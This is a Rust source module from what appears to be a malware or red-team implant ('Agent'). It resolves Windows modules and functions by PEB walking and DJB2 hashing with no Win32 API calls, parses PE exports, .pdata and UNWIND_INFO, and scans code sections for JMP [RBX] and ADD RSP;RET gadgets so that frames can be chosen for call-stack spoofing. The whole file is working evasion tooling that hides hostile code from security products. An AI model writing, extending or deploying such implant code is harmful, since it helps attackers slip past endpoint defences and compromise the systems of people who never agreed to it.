// __NAME__ Agent — PEB Walk, PE Export Parser, UNWIND_INFO, Gadget Scanners
//
// Self-contained unsafe implementation. Zero Win32 API calls.
// All module/function resolution via PEB walk + hash comparison.

#![allow(non_snake_case, dead_code)]

use super::hash::djb2_runtime;
use super::syscall;

// ─── PE structure offsets ────────────────────────────────────────────────

const IMAGE_DOS_MAGIC: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x00004550;
const DIR_EXPORT: usize = 0;
const DIR_EXCEPTION: usize = 3;

// UNWIND_CODE operations
const UWOP_PUSH_NONVOL: u8 = 0;
const UWOP_ALLOC_LARGE: u8 = 1;
const UWOP_ALLOC_SMALL: u8 = 2;
const UWOP_SET_FPREG: u8 = 3;
const UWOP_SAVE_NONVOL: u8 = 4;
const UWOP_SAVE_NONVOL_FAR: u8 = 5;
const UWOP_SAVE_XMM128: u8 = 8;
const UWOP_SAVE_XMM128_FAR: u8 = 9;
const UWOP_PUSH_MACHFRAME: u8 = 10;

const UNW_FLAG_CHAININFO: u8 = 0x04;

// Frame size limits
pub const MIN_JMP_RBX_FRAME_SIZE: usize = 0xD8;
pub const MIN_ADD_RSP_X: usize = 0xB0;

// ─── Export entry ────────────────────────────────────────────────────────

#[derive(Clone, Copy)]
pub struct ExportEntry {
    pub name_hash: u32,
    pub virtual_address: usize,
}

// ─── Gadget search results ───────────────────────────────────────────────

#[derive(Default, Clone, Copy)]
pub struct FrameSearchResult {
    pub func_addr: usize,
    pub frame_size: usize,
    pub rbp_offset: usize,
    pub call_offset: usize,
}

// ─── Inline helpers ──────────────────────────────────────────────────────

#[inline(always)]
unsafe fn read_u16(ptr: usize) -> u16 {
    *(ptr as *const u16)
}

#[inline(always)]
unsafe fn read_u32(ptr: usize) -> u32 {
    *(ptr as *const u32)
}

#[inline(always)]
unsafe fn read_usize(ptr: usize) -> usize {
    *(ptr as *const usize)
}

#[inline(always)]
unsafe fn read_u8(ptr: usize) -> u8 {
    *(ptr as *const u8)
}

// ─── PEB Walk ────────────────────────────────────────────────────────────

/// Find a loaded module by DJB2 hash of its BaseDllName (case-insensitive).
pub fn find_module_by_hash(name_hash: u32) -> Option<usize> {
    unsafe {
        let peb = syscall::read_gs60();
        if peb == 0 { return None; }

        let ldr = read_usize(peb + 0x18);
        if ldr == 0 { return None; }

        // InMemoryOrderModuleList is at offset 0x20 in PEB_LDR_DATA
        let head = ldr + 0x20;
        let mut cur = read_usize(head); // Flink

        while cur != head {
            // cur = InMemoryOrderLinks.Flink inside LDR_DATA_TABLE_ENTRY
            // DllBase is at -0x10 from InMemoryOrderLinks on x64
            // But using CONTAINING_RECORD logic:
            // InMemoryOrderLinks offset in LDR_DATA_TABLE_ENTRY = 0x10 (x64)
            // So entry base = cur - 0x10
            // DllBase is at entry + 0x30 ... but let's use standard offsets.
            //
            // x64 LDR_DATA_TABLE_ENTRY:
            //   +0x00 InLoadOrderLinks
            //   +0x10 InMemoryOrderLinks (our cur points here)
            //   +0x20 InInitializationOrderLinks
            //   +0x30 DllBase
            //   +0x38 EntryPoint
            //   +0x40 SizeOfImage
            //   +0x48 FullDllName (UNICODE_STRING)
            //   +0x58 BaseDllName (UNICODE_STRING: Length u16, MaxLen u16, pad, Buffer ptr)
            let entry_base = cur - 0x10; // offset of InMemoryOrderLinks
            let dll_base = read_usize(entry_base + 0x30);
            let name_len = read_u16(entry_base + 0x58) as usize; // Length in bytes
            let name_buf = read_usize(entry_base + 0x60); // Buffer pointer (after Length+MaxLen+pad)

            if name_buf != 0 && name_len > 0 {
                let char_count = name_len / 2;
                let mut h: u32 = 5381;
                for i in 0..char_count {
                    let wc = read_u16(name_buf + i * 2);
                    let mut c = (wc & 0xFF) as u8;
                    if c >= b'A' && c <= b'Z' {
                        c += b'a' - b'A';
                    }
                    h = h.wrapping_mul(33).wrapping_add(c as u32);
                }
                if h == name_hash {
                    return Some(dll_base);
                }
            }

            cur = read_usize(cur); // Flink
        }
        None
    }
}

/// Get PEB.ImageBaseAddress (host .exe base for Process Image Frames).
pub fn get_process_image_base() -> usize {
    unsafe {
        let peb = syscall::read_gs60();
        if peb == 0 { return 0; }
        read_usize(peb + 0x10) // PEB.ImageBaseAddress
    }
}

// ─── PE Validation ───────────────────────────────────────────────────────

fn validate_dos_nt(base: usize) -> Option<(usize, usize)> {
    unsafe {
        let e_magic = read_u16(base);
        if e_magic != IMAGE_DOS_MAGIC { return None; }

        let e_lfanew = read_u32(base + 0x3C) as usize;
        if e_lfanew == 0 { return None; }

        let nt = base + e_lfanew;
        let signature = read_u32(nt);
        if signature != IMAGE_NT_SIGNATURE { return None; }

        Some((base, nt))
    }
}

// ─── PE Export Table Parser ──────────────────────────────────────────────

// ─── API Set Resolution ──────────────────────────────────────────────────

/// Check if a DLL name (ASCII bytes) is an API Set (starts with "api-" or "ext-").
fn is_api_set(name: &[u8]) -> bool {
    if name.len() < 4 { return false; }
    let a = name[0] | 0x20;
    let b = name[1] | 0x20;
    let c = name[2] | 0x20;
    let d = name[3];
    (a == b'a' && b == b'p' && c == b'i' && d == b'-')
    || (a == b'e' && b == b'x' && c == b't' && d == b'-')
}

/// Resolve an API Set name to the host module base address via PEB ApiSetMap.
/// `name` is the DLL part of a forwarded export (e.g., b"api-ms-win-core-heap-l1-1-0").
/// Returns None if resolution fails.
fn resolve_api_set(name: &[u8]) -> Option<usize> {
    unsafe {
        let peb = super::syscall::read_gs60();
        if peb == 0 { return None; }

        // PEB+0x68 = ApiSetMap pointer (x64)
        let api_set_map = read_usize(peb + 0x68);
        if api_set_map == 0 { return None; }

        // API_SET_NAMESPACE: Version(u32), Size(u32), Flags(u32), Count(u32),
        //   EntryOffset(u32), HashOffset(u32), HashFactor(u32) — 28 bytes
        let version = read_u32(api_set_map);
        if version < 2 { return None; }

        let count = read_u32(api_set_map + 12);
        if count == 0 { return None; }

        let entry_offset = read_u32(api_set_map + 16) as usize;
        let hash_offset  = read_u32(api_set_map + 20) as usize;
        let hash_factor  = read_u32(api_set_map + 24);

        // Lowercase the name to a stack buffer
        let name_len = core::cmp::min(name.len(), 128);
        let mut lower = [0u8; 128];
        for i in 0..name_len {
            lower[i] = if name[i] >= b'A' && name[i] <= b'Z' { name[i] + 32 } else { name[i] };
        }

        // Find last hyphen → hash only the portion up to (not including) it
        let mut last_hyphen = 0usize;
        for i in 0..name_len {
            if lower[i] == b'-' { last_hyphen = i; }
        }
        if last_hyphen == 0 { return None; }

        let hash_name = &lower[..last_hyphen];

        // Compute hash using namespace.HashFactor
        let mut hash_key: u32 = 0;
        for &ch in hash_name {
            hash_key = hash_key.wrapping_mul(hash_factor).wrapping_add(ch as u32);
        }

        // Binary search the API_SET_HASH_ENTRY table
        // Each entry: Hash(u32) + Index(u32) = 8 bytes
        let mut lo: i32 = 0;
        let mut hi: i32 = count as i32 - 1;
        let mut found_index: i32 = -1;

        while lo <= hi {
            let mid = (lo + hi) / 2;
            let he = api_set_map + hash_offset + (mid as usize) * 8;
            let he_hash = read_u32(he);

            if hash_key < he_hash {
                hi = mid - 1;
            } else if hash_key > he_hash {
                lo = mid + 1;
            } else {
                // Hash match — verify against the namespace entry name (UTF-16)
                let idx = read_u32(he + 4) as usize;
                // API_SET_NAMESPACE_ENTRY: Flags(4), NameOffset(4), NameLength(4),
                //   HashedLength(4), ValueOffset(4), ValueCount(4) — 24 bytes
                let nse = api_set_map + entry_offset + idx * 24;
                let nse_name_off = read_u32(nse + 4) as usize;
                let nse_hashed_len = read_u32(nse + 12) as usize; // bytes, UTF-16
                let nse_chars = nse_hashed_len / 2;
                let nse_name = api_set_map + nse_name_off;

                let mut ok = nse_chars == hash_name.len();
                if ok {
                    for i in 0..nse_chars {
                        let wc = read_u16(nse_name + i * 2);
                        let mut c = (wc & 0xFF) as u8;
                        if c >= b'A' && c <= b'Z' { c += 32; }
                        if c != hash_name[i] { ok = false; break; }
                    }
                }
                if ok { found_index = idx as i32; }
                break;
            }
        }

        if found_index < 0 { return None; }

        // Read the value entry for the resolved namespace entry
        let nse = api_set_map + entry_offset + (found_index as usize) * 24;
        let val_offset = read_u32(nse + 16) as usize;
        let val_count  = read_u32(nse + 20);
        if val_count == 0 { return None; }

        // API_SET_VALUE_ENTRY: Flags(4), NameOffset(4), NameLength(4),
        //   ValueOffset(4), ValueLength(4) — 20 bytes
        // Use the last (default) value entry — entry[0] may be a per-DLL
        // override (e.g. kernel32→kernel32) that causes circular resolution.
        let ve = api_set_map + val_offset + ((val_count as usize - 1) * 20);
        let host_off = read_u32(ve + 12) as usize;
        let host_len = read_u32(ve + 16) as usize; // bytes, UTF-16
        if host_len == 0 { return None; }

        // Hash the host DLL name (UTF-16, already includes ".dll") with DJB2
        let host_ptr = api_set_map + host_off;
        let host_chars = host_len / 2;
        let mut dll_hash: u32 = 5381;
        for i in 0..host_chars {
            let wc = read_u16(host_ptr + i * 2);
            let mut c = (wc & 0xFF) as u8;
            if c >= b'A' && c <= b'Z' { c += 32; }
            dll_hash = dll_hash.wrapping_mul(33).wrapping_add(c as u32);
        }

        find_module_by_hash(dll_hash)
    }
}

/// Resolve a single export by DJB2 hash. Returns 0 if not found.
pub fn resolve_export_by_hash(module_base: usize, func_hash: u32) -> usize {
    unsafe {
        let (_, nt) = match validate_dos_nt(module_base) {
            Some(v) => v,
            None => return 0,
        };

        // OptionalHeader starts at nt+0x18 (after Signature + FileHeader)
        // DataDirectory[0] (export) at nt+0x18 + 0x70 = nt+0x88 on x64
        let export_rva = read_u32(nt + 0x88) as usize;
        let export_size = read_u32(nt + 0x8C) as usize;
        if export_rva == 0 || export_size == 0 { return 0; }

        let export_dir = module_base + export_rva;
        let num_names = read_u32(export_dir + 0x18) as usize;
        let names_rva = read_u32(export_dir + 0x20) as usize;
        let funcs_rva = read_u32(export_dir + 0x1C) as usize;
        let ordinals_rva = read_u32(export_dir + 0x24) as usize;

        let names = module_base + names_rva;
        let funcs = module_base + funcs_rva;
        let ordinals = module_base + ordinals_rva;

        for i in 0..num_names {
            let name_rva = read_u32(names + i * 4) as usize;
            let name_ptr = module_base + name_rva;

            // Read null-terminated name
            let mut len = 0usize;
            while read_u8(name_ptr + len) != 0 && len < 256 {
                len += 1;
            }
            let name_bytes = core::slice::from_raw_parts(name_ptr as *const u8, len);
            if djb2_runtime(name_bytes) == func_hash {
                let ordinal = read_u16(ordinals + i * 2) as usize;
                let func_rva = read_u32(funcs + ordinal * 4) as usize;

                // Forwarded export: RVA points inside export directory → it's
                // an ASCII string like "KERNELBASE.GetProcessMitigationPolicy".
                // Follow the chain by resolving from the target DLL.
                if func_rva >= export_rva && func_rva < export_rva + export_size {
                    let fwd_ptr = module_base + func_rva;
                    let mut fwd_len = 0usize;
                    while read_u8(fwd_ptr + fwd_len) != 0 && fwd_len < 256 { fwd_len += 1; }
                    let fwd = core::slice::from_raw_parts(fwd_ptr as *const u8, fwd_len);

                    // Find the '.' separator
                    let mut dot = 0usize;
                    while dot < fwd_len && fwd[dot] != b'.' { dot += 1; }
                    if dot == 0 || dot >= fwd_len { return 0; }

                    // Hash the forwarded function name
                    let fwd_func_hash = djb2_runtime(&fwd[dot + 1..]);

                    // Resolve the target module — API Set names go through
                    // PEB ApiSetMap, regular DLLs through the module list.
                    let dll_name = &fwd[..dot];
                    let target_base = if is_api_set(dll_name) {
                        resolve_api_set(dll_name)
                    } else {
                        let mut dll_hash: u32 = 5381;
                        for &c in dll_name {
                            let c = if c >= b'A' && c <= b'Z' { c + (b'a' - b'A') } else { c };
                            dll_hash = dll_hash.wrapping_mul(33).wrapping_add(c as u32);
                        }
                        for &c in b".dll" {
                            dll_hash = dll_hash.wrapping_mul(33).wrapping_add(c as u32);
                        }
                        find_module_by_hash(dll_hash)
                    };

                    // Resolve from the target module
                    if let Some(target_base) = target_base {
                        return resolve_export_by_hash(target_base, fwd_func_hash);
                    }
                    return 0; // target DLL not loaded
                }

                return module_base + func_rva;
            }
        }
        0
    }
}

/// Enumerate all exports. Returns Vec<ExportEntry>.
pub fn get_exports(module_base: usize) -> Vec<ExportEntry> {
    let mut out = Vec::new();
    unsafe {
        let (_, nt) = match validate_dos_nt(module_base) {
            Some(v) => v,
            None => return out,
        };

        let export_rva = read_u32(nt + 0x88) as usize;
        let export_size = read_u32(nt + 0x8C) as usize;
        if export_rva == 0 || export_size == 0 { return out; }

        let export_dir = module_base + export_rva;
        let num_names = read_u32(export_dir + 0x18) as usize;
        let names_rva = read_u32(export_dir + 0x20) as usize;
        let funcs_rva = read_u32(export_dir + 0x1C) as usize;
        let ordinals_rva = read_u32(export_dir + 0x24) as usize;

        let names = module_base + names_rva;
        let funcs = module_base + funcs_rva;
        let ordinals = module_base + ordinals_rva;

        out.reserve(num_names);
        for i in 0..num_names {
            let name_rva = read_u32(names + i * 4) as usize;
            let name_ptr = module_base + name_rva;
            let mut len = 0usize;
            while read_u8(name_ptr + len) != 0 && len < 256 {
                len += 1;
            }
            let name_bytes = core::slice::from_raw_parts(name_ptr as *const u8, len);
            let ordinal = read_u16(ordinals + i * 2) as usize;
            let func_rva = read_u32(funcs + ordinal * 4) as usize;
            out.push(ExportEntry {
                name_hash: djb2_runtime(name_bytes),
                virtual_address: module_base + func_rva,
            });
        }
    }
    out
}

// ─── .text Section Locator ───────────────────────────────────────────────

pub fn find_text_section(module_base: usize) -> Option<(usize, usize)> {
    unsafe {
        let (_, nt) = validate_dos_nt(module_base)?;

        // FileHeader at nt+4, NumberOfSections at nt+6
        let num_sections = read_u16(nt + 0x06) as usize;
        let opt_hdr_size = read_u16(nt + 0x14) as usize;
        let section_start = nt + 0x18 + opt_hdr_size;

        for i in 0..num_sections {
            let sec = section_start + i * 40;
            let name = core::slice::from_raw_parts(sec as *const u8, 5);
            if name == b".text" {
                let vaddr = read_u32(sec + 0x0C) as usize;
                let raw_size = read_u32(sec + 0x10) as usize;
                return Some((module_base + vaddr, raw_size));
            }
        }
        None
    }
}

// ─── .pdata Binary Search ────────────────────────────────────────────────

#[derive(Clone, Copy)]
struct RuntimeFunction {
    begin_address: u32,
    end_address: u32,
    unwind_data: u32,
}

fn get_pdata_table(module_base: usize) -> Option<(usize, usize)> {
    unsafe {
        let (_, nt) = validate_dos_nt(module_base)?;
        // DataDirectory[3] is exception directory
        // On x64: nt + 0x18 + 0x70 + DIR_EXCEPTION*8 = nt + 0x88 + 3*8 = nt + 0xA0
        let exc_rva = read_u32(nt + 0xA0) as usize;
        let exc_size = read_u32(nt + 0xA4) as usize;
        if exc_rva == 0 || exc_size == 0 { return None; }
        Some((module_base + exc_rva, exc_size / 12)) // 12 = sizeof(RUNTIME_FUNCTION)
    }
}

fn lookup_runtime_function(module_base: usize, addr: usize) -> Option<RuntimeFunction> {
    let (table_base, count) = get_pdata_table(module_base)?;
    let rva = (addr - module_base) as u32;

    unsafe {
        let mut low = 0usize;
        let mut high = count;
        while low < high {
            let mid = (low + high) / 2;
            let entry_ptr = table_base + mid * 12;
            let begin = read_u32(entry_ptr);
            let end = read_u32(entry_ptr + 4);
            let unwind = read_u32(entry_ptr + 8);

            if rva < begin {
                high = mid;
            } else if rva >= end {
                low = mid + 1;
            } else {
                return Some(RuntimeFunction {
                    begin_address: begin,
                    end_address: end,
                    unwind_data: unwind,
                });
            }
        }
    }
    None
}

// ─── UNWIND_INFO Frame Size Calculator ───────────────────────────────────

fn calc_unwind_frame_size(image_base: usize, rf: &RuntimeFunction) -> usize {
    unsafe {
        let unwind_ptr = image_base + rf.unwind_data as usize;
        let version_flags = read_u8(unwind_ptr);
        if (version_flags & 0x07) != 1 { return 0; }

        let code_count = read_u8(unwind_ptr + 2) as usize;
        let codes_base = unwind_ptr + 4;

        let mut total_size: usize = 0;
        let mut has_save = false;
        let mut max_save_off: usize = 0;
        let mut idx = 0;

        while idx < code_count {
            let code_ptr = codes_base + idx * 2;
            let op_and_info = read_u8(code_ptr + 1);
            let op = op_and_info & 0x0F;
            let info = (op_and_info >> 4) & 0x0F;

            match op {
                UWOP_PUSH_NONVOL => { total_size += 8; }
                UWOP_ALLOC_SMALL => { total_size += (info as usize) * 8 + 8; }
                UWOP_ALLOC_LARGE => {
                    idx += 1;
                    if idx >= code_count { return 0; }
                    let nc = codes_base + idx * 2;
                    let lo = read_u8(nc) as usize;
                    let hi = read_u8(nc + 1) as usize;
                    let mut frame_off = lo | (hi << 8);
                    if info == 0 {
                        frame_off *= 8;
                    } else {
                        idx += 1;
                        if idx >= code_count { return 0; }
                        let nc2 = codes_base + idx * 2;
                        let lo2 = read_u8(nc2) as usize;
                        let hi2 = read_u8(nc2 + 1) as usize;
                        frame_off += (lo2 | (hi2 << 8)) << 16;
                    }
                    total_size += frame_off;
                }
                UWOP_SET_FPREG => {}
                UWOP_SAVE_NONVOL => {
                    idx += 1;
                    if idx < code_count {
                        let nc = codes_base + idx * 2;
                        let lo = read_u8(nc) as usize;
                        let hi = read_u8(nc + 1) as usize;
                        let save_off = (lo | (hi << 8)) * 8;
                        has_save = true;
                        if save_off > max_save_off { max_save_off = save_off; }
                    }
                }
                UWOP_SAVE_NONVOL_FAR => {
                    if idx + 2 < code_count {
                        let nc1 = codes_base + (idx + 1) * 2;
                        let nc2 = codes_base + (idx + 2) * 2;
                        let lo1 = read_u8(nc1) as usize | ((read_u8(nc1 + 1) as usize) << 8);
                        let lo2 = read_u8(nc2) as usize | ((read_u8(nc2 + 1) as usize) << 8);
                        let save_off = lo1 | (lo2 << 16);
                        has_save = true;
                        if save_off > max_save_off { max_save_off = save_off; }
                    }
                    idx += 2;
                }
                UWOP_SAVE_XMM128 => { return 0; } // XMM = unsafe for spoofing
                UWOP_SAVE_XMM128_FAR => { return 0; } // XMM = unsafe for spoofing
                UWOP_PUSH_MACHFRAME => {
                    total_size += if info == 0 { 0x28 } else { 0x30 };
                }
                _ => {}
            }
            idx += 1;
        }

        // Handle chained unwind info
        let flags = version_flags >> 3;
        if (flags & UNW_FLAG_CHAININFO) != 0 {
            let mut chain_idx = code_count;
            if chain_idx % 2 != 0 { chain_idx += 1; }
            let chain_ptr = codes_base + chain_idx * 2;
            let chain_rf = RuntimeFunction {
                begin_address: read_u32(chain_ptr),
                end_address: read_u32(chain_ptr + 4),
                unwind_data: read_u32(chain_ptr + 8),
            };
            let chain_size = calc_unwind_frame_size(image_base, &chain_rf);
            if chain_size == 0 { return 0; }
            total_size += chain_size;
        } else {
            total_size += 8; // return address
        }

        if has_save && max_save_off >= total_size {
            return 0;
        }

        total_size
    }
}

pub fn calculate_frame_size(module_base: usize, addr: usize) -> usize {
    match lookup_runtime_function(module_base, addr) {
        Some(rf) => calc_unwind_frame_size(module_base, &rf),
        None => 0,
    }
}

// ─── Find CALL instruction in function ───────────────────────────────────

fn find_call_in_function(func_addr: usize, func_size: usize) -> usize {
    unsafe {
        for i in 0..func_size.saturating_sub(5) {
            let b = read_u8(func_addr + i);
            if b == 0xE8 {
                return i + 5;
            }
            if b == 0xFF && i + 1 < func_size && read_u8(func_addr + i + 1) == 0x15 && i + 6 <= func_size {
                return i + 6;
            }
        }
        0
    }
}

// ─── Gadget Scanners ─────────────────────────────────────────────────────

/// FindSuitableJmpRbxGadget — scan .text for JMP [RBX] (FF 23).
pub fn find_jmp_rbx_gadget(module_base: usize, min_frame: usize, require_call_preceded: bool)
    -> Option<(usize, usize)>
{
    let (text_start, text_size) = find_text_section(module_base)?;
    let mut best_addr = 0usize;
    let mut best_size = 0usize;

    unsafe {
        for i in 5..text_size.saturating_sub(1) {
            let addr = text_start + i;
            if read_u8(addr) == 0xFF && read_u8(addr + 1) == 0x23 {
                if require_call_preceded && read_u8(addr - 5) != 0xE8 {
                    continue;
                }
                let fs = calculate_frame_size(module_base, addr);
                if fs >= min_frame && fs > best_size {
                    best_addr = addr;
                    best_size = fs;
                }
            }
        }
    }

    if best_addr == 0 { None } else { Some((best_addr, best_size)) }
}

/// FindAddRspXGadget — scan for ADD RSP,imm8;RET or ADD RSP,imm32;RET.
pub fn find_add_rsp_x_gadget(module_base: usize, min_x: usize)
    -> Option<(usize, usize, usize)>
{
    let min_x = min_x.max(MIN_ADD_RSP_X);
    let (text_start, text_size) = find_text_section(module_base)?;
    let mut best_addr = 0usize;
    let mut best_x = usize::MAX;
    let mut best_fs = 0usize;

    unsafe {
        for i in 0..text_size.saturating_sub(5) {
            let ptr = text_start + i;
            let b0 = read_u8(ptr);
            let b1 = read_u8(ptr + 1);
            let b2 = read_u8(ptr + 2);

            if b0 == 0x48 && b1 == 0x83 && b2 == 0xC4 {
                let imm = read_u8(ptr + 3) as usize;
                if read_u8(ptr + 4) == 0xC3 && imm >= min_x && imm < best_x {
                    let fs = calculate_frame_size(module_base, ptr);
                    if fs > 0 {
                        best_addr = ptr; best_x = imm; best_fs = fs;
                    }
                }
            } else if b0 == 0x48 && b1 == 0x81 && b2 == 0xC4 && i + 8 <= text_size {
                let imm = read_u32(ptr + 3) as usize;
                if read_u8(ptr + 7) == 0xC3 && imm >= min_x && imm < best_x {
                    let fs = calculate_frame_size(module_base, ptr);
                    if fs > 0 {
                        best_addr = ptr; best_x = imm; best_fs = fs;
                    }
                }
            }
        }
    }

    if best_addr == 0 { None } else { Some((best_addr, best_x, best_fs)) }
}

/// FindSetFpregFrame — scan .pdata for functions with UWOP_SET_FPREG.
pub fn find_set_fpreg_frame(module_base: usize, min_frame_size: usize)
    -> Option<FrameSearchResult>
{
    let (table_base, count) = get_pdata_table(module_base)?;
    let mut best = FrameSearchResult::default();

    unsafe {
        for idx in 0..count {
            let entry_ptr = table_base + idx * 12;
            let begin = read_u32(entry_ptr);
            let end = read_u32(entry_ptr + 4);
            let unwind_data = read_u32(entry_ptr + 8);

            let unwind_ptr = module_base + unwind_data as usize;
            let code_count = read_u8(unwind_ptr + 2) as usize;
            let codes_base = unwind_ptr + 4;

            let mut has_set_fpreg = false;
            let mut has_xmm = false;
            let mut ci = 0;
            while ci < code_count {
                let op = read_u8(codes_base + ci * 2 + 1) & 0x0F;
                if op == UWOP_SET_FPREG { has_set_fpreg = true; }
                if op == UWOP_SAVE_XMM128 || op == UWOP_SAVE_XMM128_FAR { has_xmm = true; }
                match op {
                    UWOP_ALLOC_LARGE => { ci += if read_u8(codes_base + ci * 2 + 1) >> 4 == 0 { 1 } else { 2 }; }
                    UWOP_SAVE_NONVOL => { ci += 1; }
                    UWOP_SAVE_NONVOL_FAR => { ci += 2; }
                    UWOP_SAVE_XMM128 => { ci += 1; }
                    UWOP_SAVE_XMM128_FAR => { ci += 2; }
                    _ => {}
                }
                ci += 1;
            }

            if !has_set_fpreg || has_xmm { continue; }

            let rf = RuntimeFunction { begin_address: begin, end_address: end, unwind_data };
            let fs = calc_unwind_frame_size(module_base, &rf);
            if fs < min_frame_size { continue; }

            let func_addr = module_base + begin as usize;
            let func_size = (end - begin) as usize;
            let call_off = find_call_in_function(func_addr, func_size);

            if call_off != 0 && (best.call_offset == 0 || fs > best.frame_size) {
                best = FrameSearchResult { func_addr, frame_size: fs, rbp_offset: 0, call_offset: call_off };
            } else if best.func_addr == 0 {
                best = FrameSearchResult { func_addr, frame_size: fs, rbp_offset: 0, call_offset: call_off };
            }
        }
    }

    if best.func_addr == 0 { None } else { Some(best) }
}

/// FindPushRbpFrame — scan .pdata for PUSH_NONVOL(RBP) without SET_FPREG.
pub fn find_push_rbp_frame(module_base: usize) -> Option<FrameSearchResult> {
    let (table_base, count) = get_pdata_table(module_base)?;
    let mut best = FrameSearchResult::default();

    unsafe {
        for idx in 0..count {
            let entry_ptr = table_base + idx * 12;
            let begin = read_u32(entry_ptr);
            let end = read_u32(entry_ptr + 4);
            let unwind_data = read_u32(entry_ptr + 8);

            let unwind_ptr = module_base + unwind_data as usize;
            let code_count = read_u8(unwind_ptr + 2) as usize;
            let codes_base = unwind_ptr + 4;

            let mut has_push_rbp = false;
            let mut has_set_fpreg = false;
            let mut has_xmm = false;
            let mut rbp_stack_off: usize = 0;
            let mut current_stack_off: usize = 0;
            let mut ci = 0;

            while ci < code_count {
                let op_info_byte = read_u8(codes_base + ci * 2 + 1);
                let op = op_info_byte & 0x0F;
                let info = (op_info_byte >> 4) & 0x0F;

                match op {
                    UWOP_PUSH_NONVOL => {
                        current_stack_off += 8;
                        if info == 5 { // RBP = register 5
                            has_push_rbp = true;
                            rbp_stack_off = current_stack_off;
                        }
                    }
                    UWOP_ALLOC_SMALL => {
                        current_stack_off += (info as usize) * 8 + 8;
                    }
                    UWOP_ALLOC_LARGE => {
                        ci += 1;
                        if ci >= code_count { break; }
                        let nc = codes_base + ci * 2;
                        let lo = read_u8(nc) as usize;
                        let hi = read_u8(nc + 1) as usize;
                        let mut frame_off = lo | (hi << 8);
                        if info == 0 {
                            frame_off *= 8;
                        } else {
                            ci += 1;
                            if ci >= code_count { break; }
                            let nc2 = codes_base + ci * 2;
                            let hw = read_u8(nc2) as usize | ((read_u8(nc2 + 1) as usize) << 8);
                            frame_off += hw << 16;
                        }
                        current_stack_off += frame_off;
                    }
                    UWOP_SET_FPREG => { has_set_fpreg = true; }
                    UWOP_SAVE_NONVOL => { ci += 1; }
                    UWOP_SAVE_NONVOL_FAR => { ci += 2; }
                    UWOP_SAVE_XMM128 => { has_xmm = true; ci += 1; }
                    UWOP_SAVE_XMM128_FAR => { has_xmm = true; ci += 2; }
                    _ => {}
                }
                ci += 1;
            }

            if !has_push_rbp || has_set_fpreg || has_xmm { continue; }

            let rf = RuntimeFunction { begin_address: begin, end_address: end, unwind_data };
            let fs = calc_unwind_frame_size(module_base, &rf);
            if fs == 0 { continue; }

            let func_addr = module_base + begin as usize;
            let func_size = (end - begin) as usize;
            let call_off = find_call_in_function(func_addr, func_size);

            if call_off != 0 && (best.call_offset == 0 || fs > best.frame_size) {
                best = FrameSearchResult { func_addr, frame_size: fs, rbp_offset: rbp_stack_off, call_offset: call_off };
            } else if best.func_addr == 0 {
                best = FrameSearchResult { func_addr, frame_size: fs, rbp_offset: rbp_stack_off, call_offset: call_off };
            }
        }
    }

    if best.func_addr == 0 { None } else { Some(best) }
}


